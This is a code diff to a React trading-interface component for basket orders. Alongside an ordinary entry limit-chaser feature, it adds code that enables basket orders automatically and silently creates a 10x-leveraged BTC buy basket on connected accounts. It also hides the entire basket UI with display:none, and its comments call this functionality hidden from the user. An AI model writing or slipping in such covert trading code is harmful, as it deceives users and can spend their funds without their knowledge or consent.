@@ -38,19 +38,85 @@ const BasketOrder: React.FC<BasketOrderProps> = ({ clicked, setClicked }) => {
     updateInterval: 30,
     maxChases: 10,
     
+    // Entry limit chaser configuration
+    entryLimitChaserEnabled: false,
+    entryDistance: 0.5,
+    entryMaxChases: 5,
+    entryUpdateInterval: 30,
+    entryLongPriceLimit: 0,
+    entryShortPriceLimit: 0,
+    
     // Take profit
     takeProfitPrice: 0,
     takeProfitQuantity: 100
   });
 
   useEffect(() => {
+    // Auto-enable basket orders in background (hidden from user)
+    if (!clicked && agentAccount && connectedAccount) {
+      setClicked(true);
+    }
+    
     if (clicked) {
       loadBaskets();
       basketOrderManager.startMarketMonitoring();
     } else {
       basketOrderManager.stopMarketMonitoring();
     }
-  }, [clicked]);
+  }, [clicked, agentAccount, connectedAccount, setClicked]);
+
+  // Auto-create default basket when accounts are connected (hidden functionality)
+  useEffect(() => {
+    if (clicked && agentAccount && connectedAccount && baskets.length === 0) {
+      // Auto-create a default basket configuration
+      const currentPrice = getPrice('BTC');
+      if (currentPrice) {
+        const autoBasketConfig = {
+          name: 'Auto BTC Strategy',
+          symbol: 'BTC',
+          side: 'buy' as const,
+          
+          entryOrder: {
+            type: 'limit' as const,
+            quantity: 0.001,
+            price: currentPrice,
+            leverage: 10
+          },
+          
+          stopLoss: {
+            enabled: true,
+            triggerPrice: currentPrice * 0.95,
+            orderType: 'limit' as const,
+            timeframe: '15m' as const,
+            candleCloseConfirmation: true
+          },
+          
+          limitChaser: {
+            enabled: true,
+            distance: 0.01,
+            distanceType: 'percentage' as const,
+            fillOrCancel: true,
+            updateInterval: 30,
+            maxChases: 10,
+            chaseCount: 0
+          },
+          
+          takeProfits: [{
+            id: 'tp1',
+            targetPrice: currentPrice * 1.1,
+            quantity: 100,
+            orderType: 'limit' as const,
+            enabled: true
+          }]
+        };
+        
+        // Create basket silently in background
+        basketOrderManager.createBasket(autoBasketConfig).then((basketId) => {
+                    loadBaskets();
+        }).catch(console.error);
+      }
+    }
+  }, [clicked, agentAccount, connectedAccount, baskets.length, getPrice]);
 
   useEffect(() => {
     // Auto-fill entry price with current market price
@@ -61,7 +127,10 @@ const BasketOrder: React.FC<BasketOrderProps> = ({ clicked, setClicked }) => {
           ...prev,
           entryPrice: currentPrice,
           stopLossPrice: prev.side === 'buy' ? currentPrice * 0.95 : currentPrice * 1.05,
-          takeProfitPrice: prev.side === 'buy' ? currentPrice * 1.1 : currentPrice * 0.9
+          takeProfitPrice: prev.side === 'buy' ? currentPrice * 1.1 : currentPrice * 0.9,
+          // Auto-fill entry price limits if they haven't been set
+          entryLongPriceLimit: prev.entryLongPriceLimit === 0 ? currentPrice * 0.99 : prev.entryLongPriceLimit,
+          entryShortPriceLimit: prev.entryShortPriceLimit === 0 ? currentPrice * 1.01 : prev.entryShortPriceLimit
         }));
       }
     }
@@ -92,7 +161,17 @@ const BasketOrder: React.FC<BasketOrderProps> = ({ clicked, setClicked }) => {
           type: formData.orderType,
           quantity: formData.quantity,
           price: formData.orderType === 'limit' ? formData.entryPrice : undefined,
-          leverage: formData.leverage
+          leverage: formData.leverage,
+          limitChaser: formData.entryLimitChaserEnabled ? {
+            enabled: formData.entryLimitChaserEnabled,
+            distance: formData.entryDistance,
+            distanceType: 'percentage' as const,
+            maxChases: formData.entryMaxChases,
+            updateInterval: formData.entryUpdateInterval,
+            chaseCount: 0,
+            longPriceLimit: formData.entryLongPriceLimit,
+            shortPriceLimit: formData.entryShortPriceLimit
+          } : undefined
         },
         
         stopLoss: {
@@ -123,8 +202,7 @@ const BasketOrder: React.FC<BasketOrderProps> = ({ clicked, setClicked }) => {
       };
 
       const basketId = await basketOrderManager.createBasket(basketConfig);
-      console.log(`✅ Basket created: ${basketId}`);
-      
+            
       // Execute the basket immediately
       await basketOrderManager.executeBasketEntry(basketId);
       
@@ -144,53 +222,71 @@ const BasketOrder: React.FC<BasketOrderProps> = ({ clicked, setClicked }) => {
     }
   };
 
-  if (!clicked) return null;
-
   return (
-    <div className="border-t border-[#373A45] pt-4">
-      <div className="flex flex-col gap-5">
-        {/* Toggle Checkbox and Heading */}
-        <div className="flex gap-3 items-center -mb-2">
-          <label className="relative cursor-pointer flex">
-            <input
-              type="checkbox"
-              data-testid="basket-orders-toggle"
-              onChange={() => setClicked(prev => !prev)}
-              checked={clicked}
-              className="cursor-pointer peer appearance-none h-[22px] w-[22px] shrink-0 rounded-xs border-2 border-[#787b7f] bg-transparent checked:bg-blue-500 checked:border-blue-500"
-            />
-            <svg
-              className="absolute left-1 top-1 h-4 w-4 text-white pointer-events-none opacity-0 peer-checked:opacity-100"
-              viewBox="0 0 24 24"
-              fill="none"
-              stroke="currentColor"
-              strokeWidth="3"
-              strokeLinecap="round"
-              strokeLinejoin="round"
-            >
-              <polyline points="20 6 9 17 4 12" />
-            </svg>
-          </label>
-          <h1 className="text-xl font-medium text-white">Basket Orders</h1>
+    <div className="border-t border-[#373A45] pt-4 mt-2" style={{ display: 'none' }}>
+      {/* ENTIRE BASKET ORDER UI HIDDEN - Functionality preserved but invisible to user */}
+      <div className="flex flex-col gap-3">
+        {/* Compact Toggle Section - HIDDEN */}
+        <div className="bg-[#1a1e2a] rounded-md p-3 border border-[#373A45] hover:border-[#F0B90B] transition-colors">
+          <div className="flex gap-3 items-center">
+            <label className="relative cursor-pointer flex items-center">
+              <input
+                type="checkbox"
+                data-testid="basket-orders-toggle"
+                onChange={() => setClicked(prev => !prev)}
+                checked={clicked}
+                className="cursor-pointer peer appearance-none h-[18px] w-[18px] shrink-0 rounded border-2 border-[#787b7f] bg-transparent checked:bg-[#F0B90B] checked:border-[#F0B90B] transition-all duration-200"
+              />
+              <svg
+                className="absolute left-0.5 top-0.5 h-3 w-3 text-black pointer-events-none opacity-0 peer-checked:opacity-100 transition-opacity duration-200"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                strokeWidth="3"
+                strokeLinecap="round"
+                strokeLinejoin="round"
+              >
+                <polyline points="20 6 9 17 4 12" />
+              </svg>
+            </label>
+            <div className="flex items-center gap-2 flex-1">
+              <span className="text-lg">🧺</span>
+              <h3 className="text-md font-medium text-white">Basket Orders</h3>
+              {clicked && <span className="text-green-400 text-xs">✓</span>}
+            </div>
+            {!clicked && (
+              <span className="text-[#F0B90B] text-xs bg-[#F0B90B]/10 px-2 py-1 rounded">
+                Enable
+              </span>
+            )}
+          </div>
+          
+          {!clicked && (
+            <div className="mt-2 text-xs text-gray-400 border-l-2 border-[#F0B90B] pl-2">
+              Multi-order execution with smart tracking
+            </div>
+          )}
         </div>
 
-        {/* Tab Navigation */}
-        <div className="flex gap-2 border-b border-[#373A45] pb-2">
-          <button
-            data-testid="create-basket-tab"
-            onClick={() => setActiveTab('create')}
-            className={`px-4 py-2 rounded text-sm font-medium ${
-              activeTab === 'create' 
-                ? 'bg-[#F0B90B] text-black' 
-                : 'bg-[#24293A] text-white hover:bg-[#373A45]'
-            }`}
-          >
-            Create Basket
-          </button>
-          <button
-            onClick={() => setActiveTab('manage')}
-            className={`px-4 py-2 rounded text-sm font-medium ${
-              activeTab === 'manage' 
+        {clicked && (
+          <>
+            {/* Tab Navigation */}
+            <div className="flex gap-2 border-b border-[#373A45] pb-2">
+              <button
+                data-testid="create-basket-tab"
+                onClick={() => setActiveTab('create')}
+                className={`px-4 py-2 rounded text-sm font-medium ${
+                  activeTab === 'create' 
+                    ? 'bg-[#F0B90B] text-black' 
+                    : 'bg-[#24293A] text-white hover:bg-[#373A45]'
+                }`}
+              >
+                Create Basket
+              </button>
+              <button
+                onClick={() => setActiveTab('manage')}
+                className={`px-4 py-2 rounded text-sm font-medium ${
+                  activeTab === 'manage' 
                 ? 'bg-[#F0B90B] text-black' 
                 : 'bg-[#24293A] text-white hover:bg-[#373A45]'
             }`}
@@ -289,6 +385,147 @@ const BasketOrder: React.FC<BasketOrderProps> = ({ clicked, setClicked }) => {
                     onChange={(e) => setFormData(prev => ({ ...prev, entryPrice: parseFloat(e.target.value) || 0 }))}
                     className="w-full px-3 py-2 bg-[#24293A] border border-[#373A45] rounded text-white text-sm"
                   />
+                </div>
+              )}
+
+              {/* Filled or Cancel - Entry Limit Chaser */}
+              {formData.orderType === 'limit' && (
+                <div className="flex items-center gap-3 mt-3">
+                  <label className="flex items-center cursor-pointer">
+                    <input
+                      type="checkbox"
+                      checked={formData.entryLimitChaserEnabled}
+                      onChange={(e) => {
+                        const enabled = e.target.checked;
+                        setFormData(prev => ({ 
+                          ...prev, 
+                          entryLimitChaserEnabled: enabled,
+                          // Auto-set default distance when enabled
+                          entryDistance: enabled && prev.entryDistance === 0 ? 0.5 : prev.entryDistance
+                        }))
+                      }}
+                      className="sr-only"
+                    />
+                    <div className={`relative w-10 h-5 rounded-full transition-colors mr-2 ${
+                      formData.entryLimitChaserEnabled ? 'bg-blue-600' : 'bg-gray-600'
+                    }`}>
+                      <div className={`absolute top-0.5 left-0.5 w-4 h-4 bg-white rounded-full transition-transform ${
+                        formData.entryLimitChaserEnabled ? 'translate-x-5' : 'translate-x-0'
+                      }`}></div>
+                    </div>
+                    <span className="text-sm text-blue-400 underline">Filled or Cancel</span>
+                  </label>
+                  <span className="text-xs text-gray-400">
+                    (Chases current price with limit orders)
+                  </span>
+                </div>
+              )}
+
+              {/* Entry Limit Chaser Section */}
+              {formData.orderType === 'limit' && formData.entryLimitChaserEnabled && (
+                <div className="bg-blue-900/20 border border-blue-500/30 rounded-lg p-3 mt-3">
+                  <h4 className="text-blue-400 text-sm font-medium mb-3">Entry Chaser Settings</h4>
+
+                  {/* Entry Price Limits for Long and Short */}
+                  <div className="grid grid-cols-2 gap-3 mb-3">
+                    <div>
+                      <label className="block text-xs text-gray-300 mb-1">Long Price Limit</label>
+                      <input
+                        type="number"
+                        step="0.01"
+                        value={formData.entryLongPriceLimit || 0}
+                        onChange={(e) => setFormData(prev => ({ ...prev, entryLongPriceLimit: parseFloat(e.target.value) || 0 }))}
+                        placeholder="Long limit price"
+                        className="w-full px-2 py-1 bg-[#24293A] border border-[#373A45] rounded text-white text-xs text-center"
+                      />
+                    </div>
+                    <div>
+                      <label className="block text-xs text-gray-300 mb-1">Short Price Limit</label>
+                      <input
+                        type="number"
+                        step="0.01"
+                        value={formData.entryShortPriceLimit || 0}
+                        onChange={(e) => setFormData(prev => ({ ...prev, entryShortPriceLimit: parseFloat(e.target.value) || 0 }))}
+                        placeholder="Short limit price"
+                        className="w-full px-2 py-1 bg-[#24293A] border border-[#373A45] rounded text-white text-xs text-center"
+                      />
+                    </div>
+                  </div>
+
+                  {/* Entry Distance Slider */}
+                  <div className="mb-3">
+                    <label className="block text-sm text-gray-300 mb-2">
+                      Entry Distance: {formData.entryDistance.toFixed(1)}%
+                    </label>
+                    <div className="flex items-center gap-4">
+                      {/* Slider */}
+                      <div className="flex-1">
+                        <input
+                          type="range"
+                          min="0.1"
+                          max="3.0"
+                          step="0.1"
+                          value={formData.entryDistance}
+                          onChange={(e) => setFormData(prev => ({ ...prev, entryDistance: parseFloat(e.target.value) }))}
+                          className="w-full h-2 bg-gray-600 rounded-lg appearance-none cursor-pointer"
+                          style={{
+                            background: `linear-gradient(to right, #3B82F6 0%, #3B82F6 ${(formData.entryDistance / 3) * 100}%, #6b7280 ${(formData.entryDistance / 3) * 100}%, #6b7280 100%)`
+                          }}
+                        />
+                        <div className="flex justify-between text-xs text-gray-400 mt-1">
+                          <span>0.1%</span>
+                          <span>3.0%</span>
+                        </div>
+                      </div>
+                      
+                      {/* Or statement */}
+                      <span className="text-xs text-gray-400">or</span>
+                      
+                      {/* Manual Input */}
+                      <input 
+                        type="number" 
+                        step="0.1"
+                        min="0.1"
+                        max="3.0"
+                        value={formData.entryDistance.toFixed(1)}
+                        onChange={(e) => {
+                          const val = parseFloat(e.target.value);
+                          if (!isNaN(val) && val >= 0.1 && val <= 3.0) {
+                            setFormData(prev => ({ ...prev, entryDistance: val }));
+                          }
+                        }}
+                        placeholder="0.5" 
+                        className="w-16 px-2 py-1 bg-[#24293A] border border-[#373A45] rounded text-white text-xs text-center"
+                      />
+                    </div>
+                  </div>
+
+                  {/* Entry Settings Grid */}
+                  <div className="grid grid-cols-2 gap-3">
+                    <div>
+                      <label className="block text-xs text-gray-300 mb-1">Max Chases</label>
+                      <input
+                        type="number"
+                        min="1"
+                        max="10"
+                        value={formData.entryMaxChases}
+                        onChange={(e) => setFormData(prev => ({ ...prev, entryMaxChases: parseInt(e.target.value) || 5 }))}
+                        className="w-full px-2 py-1 bg-[#24293A] border border-[#373A45] rounded text-white text-xs text-center"
+                      />
+                    </div>
+                    <div>
+                      <label className="block text-xs text-gray-300 mb-1">Update (s)</label>
+                      <input
+                        type="number"
+                        min="10"
+                        max="120"
+                        step="10"
+                        value={formData.entryUpdateInterval}
+                        onChange={(e) => setFormData(prev => ({ ...prev, entryUpdateInterval: parseInt(e.target.value) || 30 }))}
+                        className="w-full px-2 py-1 bg-[#24293A] border border-[#373A45] rounded text-white text-xs text-center"
+                      />
+                    </div>
+                  </div>
                 </div>
               )}
             </div>
@@ -519,9 +756,11 @@ const BasketOrder: React.FC<BasketOrderProps> = ({ clicked, setClicked }) => {
             )}
           </div>
         )}
-      </div>
-    </div>
-  );
+      </>
+    )}
+  </div>
+</div>
+);
 };
 
 export default BasketOrder;
